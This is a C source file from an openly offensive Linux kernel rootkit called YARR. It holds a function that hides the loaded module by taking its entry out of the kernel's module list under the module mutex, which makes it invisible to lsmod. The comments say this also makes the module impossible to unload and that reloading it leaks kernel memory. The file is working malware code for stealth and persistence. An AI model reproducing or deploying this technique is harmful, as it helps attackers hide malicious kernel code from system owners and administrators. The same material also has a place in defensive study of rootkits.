/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <linux/list.h>
#include <linux/module.h>

#include "hide.h"

// The list of modules loaded into the kernel and its mutex.
extern struct list_head *modules;
extern struct mutex module_mutex;

int hideYARR() {
	int res = 0;
	struct module *yarr_module;

	// TODO: Implement a technique to unload the module even if it is not in
	// the kernel's modules list.
	// Remove the module from the kernel's modules list, this will make this
	// module invisible to lsmod, but also will make it unloadable since the
	// kernel looks for the module in that list at unload time. Note that it is
	// possible to reload it again, this will led you into kernel memory
	// starvation since there will be each time another new copy of YARR. Right
	// now the only solution is reboot the system :-).
	mutex_lock(&module_mutex);
	yarr_module = THIS_MODULE;
	if (likely(yarr_module))
		list_del(&(yarr_module->list));
	mutex_unlock(&module_mutex);

	return res;
}

